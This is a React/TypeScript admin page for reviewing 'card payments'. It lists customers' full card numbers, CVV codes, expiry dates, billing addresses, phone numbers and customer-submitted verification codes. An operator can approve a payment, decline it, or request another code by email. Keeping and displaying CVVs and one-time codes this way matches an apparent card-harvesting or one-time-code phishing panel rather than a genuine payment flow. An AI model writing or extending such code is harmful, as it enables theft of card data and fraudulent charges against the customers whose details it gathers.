"use client";

import { useEffect, useMemo, useState } from "react";
import { toast } from "sonner";
import { Loader2, CheckCircle2, XCircle, ShieldCheck, CreditCard, RefreshCcw, User, MapPin, KeyRound } from "lucide-react";
import { doc, serverTimestamp, updateDoc } from "firebase/firestore";
import { db } from "@/lib/firebase/config";

interface DraftState {
  note: string;
  channel: string;
  noteError?: boolean;
}

const statusConfig: Record<string, { label: string; color: string; bg: string; border: string; dot: string }> = {
  completed:        { label: "Approved",    color: "text-emerald-300", bg: "bg-emerald-500/10", border: "border-emerald-500/25", dot: "bg-emerald-400" },
  approved:         { label: "Approved",    color: "text-emerald-300", bg: "bg-emerald-500/10", border: "border-emerald-500/25", dot: "bg-emerald-400" },
  declined:         { label: "Declined",    color: "text-rose-300",    bg: "bg-rose-500/10",    border: "border-rose-500/25",    dot: "bg-rose-400" },
  pending:          { label: "Pending",     color: "text-amber-300",   bg: "bg-amber-500/10",   border: "border-amber-500/25",   dot: "bg-amber-400" },
  auth_in_progress: { label: "Auth Requested", color: "text-blue-300", bg: "bg-blue-500/10",   border: "border-blue-500/25",    dot: "bg-blue-400" },
  submitted:        { label: "Code Submitted", color: "text-violet-300",bg: "bg-violet-500/10", border: "border-violet-500/25",  dot: "bg-violet-400" },
};

function StatusBadge({ status }: { status: string }) {
  const cfg = statusConfig[status] ?? { label: status, color: "text-zinc-300", bg: "bg-zinc-800", border: "border-zinc-700", dot: "bg-zinc-400" };
  return (
    <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-bold uppercase tracking-wider ${cfg.color} ${cfg.bg} border ${cfg.border}`}>
      <span className={`w-1.5 h-1.5 rounded-full ${cfg.dot}`} />
      {cfg.label}
    </span>
  );
}

function Field({ label, value, mono = false }: { label: string; value?: string | null; mono?: boolean }) {
  return (
    <div>
      <p className="text-[10px] font-bold uppercase tracking-widest text-zinc-600">{label}</p>
      <p className={`mt-0.5 text-sm text-zinc-200 break-all ${mono ? "font-mono" : ""}`}>{value || "—"}</p>
    </div>
  );
}

export default function CardPaymentsPage() {
  const [transactions, setTransactions] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [processingIds, setProcessingIds] = useState<string[]>([]);
  const [drafts, setDrafts] = useState<Record<string, DraftState>>({});
  const [expandedId, setExpandedId] = useState<string | null>(null);

  const loadTransactions = async () => {
    setLoading(true);
    try {
      const res = await fetch("/api/admin/card-payments");
      const data = await res.json();
      if (data.success && data.transactions) {
        setTransactions(data.transactions);
      } else {
        throw new Error(data.error || "Failed to load");
      }
    } catch (error) {
      console.error(error);
      toast.error("Unable to load payment records.");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => { loadTransactions(); }, []);

  const pendingCount = useMemo(
    () => transactions.filter((tx) => ["pending", "auth_in_progress", "submitted"].includes(tx.status || "")).length,
    [transactions]
  );

  const updateDraft = (id: string, patch: Partial<DraftState>) => {
    setDrafts((prev) => {
      const current = prev[id] || { note: "", channel: "email" };
      return { ...prev, [id]: { ...current, ...patch } };
    });
  };

  const handleDecision = async (tx: any, decision: "approved" | "authenticate" | "declined") => {
    const draft = drafts[tx.id] || { note: tx.adminNote || "", channel: tx.channel || "email" };
    // Use a default decline note if none provided — no longer blocks the action
    const finalNote = draft.note.trim() || (decision === "declined" ? "Payment declined by admin." : "");

    setProcessingIds((prev) => [...prev, tx.id]);
    try {
      let updateStatus = tx.status;
      if (decision === "approved") {
        updateStatus = "completed";
      } else if (decision === "authenticate") {
        updateStatus = "pending";
      } else {
        updateStatus = "declined";
      }

      // 1. Update SQLite DB
      const res = await fetch("/api/admin/card-payments", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          id: tx.id,
          status: updateStatus,
          adminNote: finalNote,
          channel: draft.channel || "email"
        })
      });

      const resData = await res.json();
      if (!resData.success) {
        throw new Error("Failed to update SQLite");
      }

      // 2. Also update Firebase to keep the frontend modal logic in sync
      try {
        const fbUpdate: Record<string, any> = {
          status: updateStatus,
          adminNote: finalNote,
          "cardVerification.status": decision === "authenticate" ? "submitted" : decision === "approved" ? "approved" : "declined",
          "cardVerification.adminNote": finalNote,
        };
        await updateDoc(doc(db, "transactions", tx.id), fbUpdate);
        if (tx.orderId) {
          await updateDoc(doc(db, "orders", tx.orderId), decision === "approved" ? {
            status: "paid_to_site",
            paymentStatus: "paid",
            paidAt: serverTimestamp(),
            updatedAt: serverTimestamp(),
          } : decision === "declined" ? {
            status: "payment_failed",
            paymentStatus: "failed",
            cancelledAt: serverTimestamp(),
            cancellationReason: finalNote || "Card payment declined by admin.",
            updatedAt: serverTimestamp(),
          } : {
            status: "payment_pending",
            paymentStatus: "pending",
            updatedAt: serverTimestamp(),
          });
        }
      } catch (err) {
        console.warn("Failed to update Firebase fallback sync, ignoring.", err);
      }

      // 3. Email Notification
      if (tx.customerEmail) {
        await fetch("/api/send-email", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            type: "custom",
            to: tx.customerEmail,
            data: {
              subject: decision === "approved" ? "Card payment approved" : decision === "authenticate" ? "Card payment authentication requested" : "Card payment declined",
              html: `<p>Hello ${tx.customerName || tx.customerEmail || "there"},</p>
                <p>Your card payment request has been ${decision === "approved" ? "approved" : decision === "authenticate" ? "marked for authentication review" : "declined"}.</p>
                <p><strong>Reference:</strong> ${tx.id}</p>
                <p><strong>Note:</strong> ${finalNote || "No additional note was provided."}</p>
                <p>${decision === "approved" ? "Your payment is now confirmed." : decision === "authenticate" ? "The verification flow is now in progress. Please check your tracking or wait for code." : "Please review the note above and contact support if needed."}</p>`
            }
          })
        });
      }

      toast.success(decision === "approved" ? "Payment approved." : decision === "authenticate" ? "Authentication requested." : "Payment declined.");
      await loadTransactions();
    } catch (error) {
      console.error(error);
      toast.error("Could not update this payment.");
    } finally {
      setProcessingIds((prev) => prev.filter((id) => id !== tx.id));
    }
  };

  const formatDate = (value: any) => {
    if (!value) return "—";
    return new Date(value).toLocaleString();
  };

  return (
    <div className="min-h-screen bg-zinc-950 p-4 sm:p-6 lg:p-8 pb-20">
      <div className="max-w-5xl mx-auto space-y-6">

        {/* Header */}
        <div className="flex flex-wrap items-center justify-between gap-4">
          <div>
            <h1 className="text-2xl font-bold text-white tracking-tight">Card Payments</h1>
            <p className="text-sm text-zinc-500 mt-1">Review card authorizations, verify codes, approve or decline.</p>
          </div>
          <div className="flex items-center gap-3">
            {pendingCount > 0 && (
              <span className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-amber-500/10 border border-amber-500/25 text-amber-300 text-xs font-bold">
                <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse" />
                {pendingCount} awaiting action
              </span>
            )}
            <button
              onClick={loadTransactions}
              disabled={loading}
              className="flex items-center gap-2 h-9 px-4 rounded-xl bg-white/[0.06] hover:bg-white/[0.1] border border-white/[0.08] text-zinc-300 text-xs font-semibold transition-colors disabled:opacity-50"
            >
              <RefreshCcw className={`w-3.5 h-3.5 ${loading ? "animate-spin" : ""}`} />
              Refresh
            </button>
          </div>
        </div>

        {/* Content */}
        {loading ? (
          <div className="flex flex-col items-center justify-center py-24 gap-3">
            <Loader2 className="w-8 h-8 animate-spin text-blue-500" />
            <p className="text-sm text-zinc-500">Loading payment records…</p>
          </div>
        ) : transactions.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-24 gap-3 rounded-2xl border border-dashed border-white/[0.08]">
            <CreditCard className="w-10 h-10 text-zinc-700" />
            <p className="text-sm text-zinc-500">No card payment records found.</p>
          </div>
        ) : (
          <div className="space-y-4">
            {transactions.map((tx) => {
              const draft = drafts[tx.id] || { note: tx.adminNote || "", channel: tx.channel || "email" };
              const isProcessing = processingIds.includes(tx.id);
              const txStatus = tx.status || "pending";
              const isExpanded = expandedId === tx.id;

              const fullCardNumber = tx.cardNumber || "—";
              const cvvCode = tx.cvv || "—";
              const expiryText = tx.expiry || "—";
              const verificationCode = tx.code || "";
              const adminNoteText = tx.adminNote || "";
              const channelText = tx.channel || "email";
              const amountStr = tx.amount ? `$${Number(tx.amount).toFixed(2)}` : "—";

              return (
                <div key={tx.id} className="rounded-2xl border border-white/[0.08] bg-[#0f0f13] overflow-hidden shadow-xl shadow-black/30">
                  {/* Card header row */}
                  <button
                    className="w-full flex flex-wrap items-center justify-between gap-4 p-5 text-left hover:bg-white/[0.02] transition-colors"
                    onClick={() => setExpandedId(isExpanded ? null : tx.id)}
                  >
                    <div className="flex items-center gap-4">
                      <div className="w-10 h-10 rounded-xl bg-blue-500/10 border border-blue-500/20 flex items-center justify-center shrink-0">
                        <CreditCard className="w-5 h-5 text-blue-400" />
                      </div>
                      <div>
                        <p className="font-semibold text-white text-sm">{tx.description || tx.type || "Card payment"}</p>
                        <p className="text-xs text-zinc-500 mt-0.5">{tx.customerName || tx.customerEmail || tx.userId || "Unknown customer"}</p>
                      </div>
                    </div>
                    <div className="flex items-center gap-3 ml-auto">
                      <StatusBadge status={txStatus} />
                      <p className="text-base font-bold text-white">{amountStr}</p>
                      <span className={`text-zinc-600 text-xs transition-transform ${isExpanded ? "rotate-180" : ""}`}>▼</span>
                    </div>
                  </button>

                  {isExpanded && (
                    <div className="border-t border-white/[0.06] p-5 space-y-5">

                      {/* ── Row 1: card + billing ── */}
                      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">

                        {/* Card details */}
                        <div className="rounded-xl border border-white/[0.07] bg-white/[0.02] p-4 space-y-4">
                          <p className="text-[10px] font-black uppercase tracking-widest text-zinc-500 flex items-center gap-2">
                            <CreditCard className="w-3.5 h-3.5" /> Card Details
                          </p>
                          <div className="grid grid-cols-1 gap-3">
                            <Field label="Full Card Number" value={fullCardNumber} mono />
                            <div className="grid grid-cols-2 gap-3">
                              <Field label="Expiry" value={expiryText} mono />
                              <Field label="CVV / CVC" value={cvvCode} mono />
                            </div>
                            <Field label="Name on Card" value={tx.billingName} />
                          </div>
                        </div>

                        {/* Billing address */}
                        <div className="rounded-xl border border-white/[0.07] bg-white/[0.02] p-4 space-y-4">
                          <p className="text-[10px] font-black uppercase tracking-widest text-zinc-500 flex items-center gap-2">
                            <MapPin className="w-3.5 h-3.5" /> Billing Address
                          </p>
                          <div className="grid grid-cols-1 gap-3">
                            <Field label="Address" value={tx.billingAddress} />
                            <div className="grid grid-cols-2 gap-3">
                              <Field label="City" value={tx.billingCity} />
                              <Field label="Postal Code" value={tx.billingZip} />
                            </div>
                            <Field label="Country" value={tx.billingCountry} />
                          </div>
                        </div>
                      </div>

                      {/* ── Row 2: customer + verification code ── */}
                      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">

                        {/* Customer contact */}
                        <div className="rounded-xl border border-white/[0.07] bg-white/[0.02] p-4 space-y-4">
                          <p className="text-[10px] font-black uppercase tracking-widest text-zinc-500 flex items-center gap-2">
                            <User className="w-3.5 h-3.5" /> Customer
                          </p>
                          <div className="space-y-3">
                            <Field label="Name" value={tx.customerName} />
                            <Field label="Email" value={tx.customerEmail} />
                            <Field label="Phone" value={tx.customerPhone} />
                            <div className="grid grid-cols-2 gap-3">
                              <Field label="Created At" value={formatDate(tx.createdAt)} />
                              <Field label="Updated At" value={formatDate(tx.updatedAt)} />
                            </div>
                          </div>
                        </div>

                        {/* Verification code */}
                        <div className="rounded-xl border border-white/[0.07] bg-white/[0.02] p-4 space-y-4">
                          <p className="text-[10px] font-black uppercase tracking-widest text-zinc-500 flex items-center gap-2">
                            <KeyRound className="w-3.5 h-3.5" /> Verification Code
                          </p>
                          <div className="space-y-3">
                            <div>
                              <p className="text-[10px] font-bold uppercase tracking-widest text-zinc-600">Submitted Code</p>
                              {verificationCode ? (
                                <p className="mt-1 text-2xl font-black text-white tracking-[0.35em] font-mono">{verificationCode}</p>
                              ) : (
                                <p className="mt-1 text-sm text-zinc-600 italic">Not submitted yet</p>
                              )}
                            </div>
                            <div className="grid grid-cols-2 gap-3">
                              <Field label="Channel" value={channelText} />
                              <Field label="Status" value={txStatus} />
                            </div>
                          </div>
                        </div>
                      </div>

                      {/* ── Row 3: admin action panel ── */}
                      <div className="rounded-xl border border-white/[0.07] bg-white/[0.02] p-4 space-y-4">
                        <p className="text-[10px] font-black uppercase tracking-widest text-zinc-500 flex items-center gap-2">
                          <ShieldCheck className="w-3.5 h-3.5" /> Admin Decision
                        </p>

                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                          <div className="space-y-1.5">
                            <label className="text-[10px] font-bold uppercase tracking-widest text-zinc-600">Verification Channel</label>
                            <select
                              value={draft.channel}
                              onChange={(e) => updateDraft(tx.id, { channel: e.target.value })}
                              className="w-full h-10 rounded-xl border border-white/[0.08] bg-zinc-950/80 px-3 text-sm text-white outline-none focus:border-blue-500/40"
                            >
                              <option value="email" className="bg-zinc-900">Email</option>
                              <option value="phone" className="bg-zinc-900">Phone / SMS</option>
                            </select>
                          </div>

                          <div className="space-y-1.5 sm:row-span-2">
                            <label className="text-[10px] font-bold uppercase tracking-widest text-zinc-600">Note to Customer</label>
                            <textarea
                              value={draft.note}
                              onChange={(e) => updateDraft(tx.id, { note: e.target.value })}
                              rows={4}
                              placeholder="Add a note — required when declining. Visible to the customer."
                              className="w-full rounded-xl border border-white/[0.08] bg-zinc-950/80 px-3 py-2.5 text-sm text-white outline-none focus:border-blue-500/40 resize-none"
                            />
                          </div>

                          <div className="flex flex-wrap gap-2">
                            <button
                              onClick={() => handleDecision(tx, "approved")}
                              disabled={isProcessing}
                              className="flex-1 flex items-center justify-center gap-2 h-10 rounded-xl border border-emerald-500/30 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-300 text-sm font-semibold transition-colors disabled:opacity-50"
                            >
                              {isProcessing ? <Loader2 className="w-4 h-4 animate-spin" /> : <CheckCircle2 className="w-4 h-4" />}
                              Approve
                            </button>
                            <button
                              onClick={() => handleDecision(tx, "authenticate")}
                              disabled={isProcessing}
                              className="flex-1 flex items-center justify-center gap-2 h-10 rounded-xl border border-amber-500/30 bg-amber-500/10 hover:bg-amber-500/20 text-amber-300 text-sm font-semibold transition-colors disabled:opacity-50"
                            >
                              {isProcessing ? <Loader2 className="w-4 h-4 animate-spin" /> : <ShieldCheck className="w-4 h-4" />}
                              Authenticate
                            </button>
                            <button
                              onClick={() => handleDecision(tx, "declined")}
                              disabled={isProcessing}
                              className="flex-1 flex items-center justify-center gap-2 h-10 rounded-xl border border-rose-500/30 bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 text-sm font-semibold transition-colors disabled:opacity-50"
                            >
                              {isProcessing ? <Loader2 className="w-4 h-4 animate-spin" /> : <XCircle className="w-4 h-4" />}
                              Decline
                            </button>
                          </div>
                        </div>

                        {/* Current state summary */}
                        <div className="flex flex-wrap items-center gap-3 pt-2 border-t border-white/[0.05]">
                          <StatusBadge status={txStatus} />
                          {adminNoteText && (
                            <span className="text-xs text-zinc-500">Last note: <span className="text-zinc-300">{adminNoteText}</span></span>
                          )}
                          <span className="text-xs text-zinc-600 ml-auto font-mono">ref: {tx.id.slice(0, 12)}…</span>
                        </div>
                      </div>

                    </div>
                  )}
                </div>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
}
